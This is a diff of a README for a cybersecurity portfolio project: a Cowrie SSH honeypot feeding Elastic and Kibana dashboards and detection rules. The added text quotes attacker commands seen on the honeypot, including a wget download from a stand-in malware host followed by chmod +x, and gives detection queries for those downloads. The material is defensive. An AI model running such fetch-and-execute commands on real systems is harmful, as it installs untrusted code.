@@ -1,152 +1,165 @@
 # Elastic + Cowrie SSH Honeypot
 
-An internet-facing SSH honeypot built with **Cowrie** and analyzed using the **Elastic Stack** to collect and visualize real attacker behavior.
+An internet-facing SSH honeypot designed to capture and analyze attacker behavior using **Cowrie** and the **Elastic Stack**.
 
-This project simulates a real SOC telemetry pipeline by capturing SSH attack activity and ingesting it into Elastic for analysis, dashboards, and detection engineering.
+This project simulates a real-world SOC telemetry pipeline by collecting attacker activity and transforming it into actionable security insights through dashboards and detection rules.
 
 ---
 
-## Project Goals
+## Project Overview
 
-The goal of this project was to gain hands-on experience with:
+The honeypot collects real attacker activity such as:
 
-- Security telemetry pipelines
-- SIEM ingestion and normalization
-- Detection engineering
-- Threat analysis
-- Honeypot deployment and containment
+- SSH brute-force attempts
+- Credential spraying attacks
+- Attacker command execution
+- Malware download attempts
+- Geographic attack origins
+
+All telemetry is ingested into **Elastic Cloud** where it is normalized, enriched, and analyzed through Kibana dashboards.
 
 ---
 
 ## Architecture
 
-The honeypot runs on a cloud VPS and collects attacker activity which is forwarded to Elastic for analysis.
 
 ---
-
 
 ## Technologies Used
 
----
-
-- **Cowrie** – SSH/Telnet honeypot
-- **Elastic Cloud** – SIEM and log storage
-- **Elastic Agent** – telemetry ingestion
-- **Kibana** – dashboards and visualization
-- **GeoIP enrichment** – attacker geolocation
-- **Ubuntu Linux** – honeypot host
-- **UFW Firewall** – network access control
-
----
-
-## Data Pipeline
+| Technology | Purpose |
+|------------|--------|
+Cowrie | SSH/Telnet honeypot
+Elastic Cloud | Log storage and SIEM
+Elastic Agent | Telemetry ingestion
+Kibana | Dashboards and analysis
+GeoIP Enrichment | Attacker geolocation
+Ubuntu Linux | Honeypot host
+UFW Firewall | Network access control
 
 ---
+
+## Telemetry Pipeline
 
 1. Attackers connect to the Cowrie SSH honeypot
-2. Cowrie logs attacker activity in JSON format
-3. Elastic Agent collects and ships logs
-4. Ingest pipelines normalize data fields
+2. Cowrie records attacker activity in structured JSON logs
+3. Elastic Agent ships logs to Elasticsearch
+4. Ingest pipelines normalize fields into ECS format
 5. GeoIP enrichment adds geographic context
 6. Kibana dashboards visualize attacker behavior
 
 ---
 
-## Telemetry Captured
+## Dashboard Example
+
+<img src="screenshots/dashboard_1.png" width="900">
+
+The dashboard visualizes:
+
+- Attack timeline
+- Most targeted usernames
+- Most common attacker commands
+- Top attacking IP addresses
+- Geographic distribution of attacks
 
 ---
 
-The honeypot collects several types of attacker activity:
+## Geographic Attack Sources
 
-### SSH Brute Force Attempts
-- usernames attempted
-- password guesses
-- source IP addresses
+<img src="screenshots/dashboard_3.png" width="900">
 
-### Attacker Commands
-- reconnaissance commands
-- malware download attempts
-- privilege escalation attempts
+GeoIP enrichment allows visualization of attack origins by country and ASN.
 
-### Geographic Data
-- attacker country
-- ASN / network provider
-- geographic distribution of attacks
+---
+
+## Attacker Commands
+
+<img src="screenshots/dashboard_2.png" width="900">
+
+Common commands executed by attackers include:
+
+```
+CMD: uname -a
+CMD: whoami
+CMD: wget http://malware.site/payload
+CMD: chmod +x payload
+```
+
+These behaviors are typical of automated botnet propagation scripts.
 
 ---
 
 ## Detection Engineering
 
----
+Custom detection rules were implemented to identify suspicious activity.
 
-Custom detection rules were implemented to identify suspicious behavior such as:
+<img src="screenshots/rule_list.png" width="900">
 
 ### Malware Download Attempts
 
+```
 cowrie.command : "CMD: wget*"
-
-<img src="screenshots/malware_rule.png" width="800">
+```
+<img src="screenshots/malware_rule.png" width="900">
 ---
 
-### Credential Brute Force
+### SSH Brute Force Activity
 
-
+```
 event.action : "cowrie.login.failed"
-
-<img src="screenshots/bruteforce_rule.png" width="800">
+```
+<img src="screenshots/bruteforce_rule.png" width="900">
 ---
 
 ### Reconnaissance Commands
 
+```
 cowrie.command : "CMD: uname*"
-
-These detections simulate the type of alerts commonly implemented in a SOC environment.
-
-<img src="screenshots/recon_rule.png" width="800">
+```
+<img src="screenshots/recon_rule.png" width="900">
 ---
 
-## Dashboards
+These detections simulate the types of alerts generated in a Security Operations Center (SOC).
 
-Custom Kibana dashboards visualize:
-
-- Attack timeline
-- Most targeted usernames
-- Most common attacker commands
-- Geographic attack sources
-- Top attacking IP addresses
-
-<img src="screenshots/dashboard_1.png" width="800">
-
-<img src="screenshots/dashboard_2.png" width="800">
-
-<img src="screenshots/dashboard_3.png" width="800">
 ---
 
-## Security Considerations
+## Security Hardening
 
 To reduce the risk of honeypot escape:
 
-- Cowrie runs as a **non-root user**
-- SSH hardened with **key authentication**
-- VPS isolated from home network
-- Firewall restricts unnecessary services
+- Cowrie runs under a **non-root user**
+- SSH access hardened using **public key authentication**
+- Firewall restricts unnecessary ports
+- Honeypot isolated on a cloud VPS
 - Cowrie emulates commands instead of executing them
+
+---
+
+## Lessons Learned
+
+This project provided hands-on experience with:
+
+- SIEM data pipelines
+- Detection rule creation
+- Threat telemetry analysis
+- Honeypot deployment and containment
+- Elastic Stack observability
 
 ---
 
 ## Future Improvements
 
-Planned enhancements include:
+Planned improvements include:
 
-- Self-hosted Elastic Stack
+- Self-hosted Elastic Stack deployment
 - Threat intelligence enrichment
-- Automated malware analysis pipeline
+- Automated malware sample analysis
 - Additional honeypot services
 
 ---
 
 ## Author
 
-**MrNagz**
+**Tyler Nagy**
 
 Cybersecurity / SOC Analyst Candidate
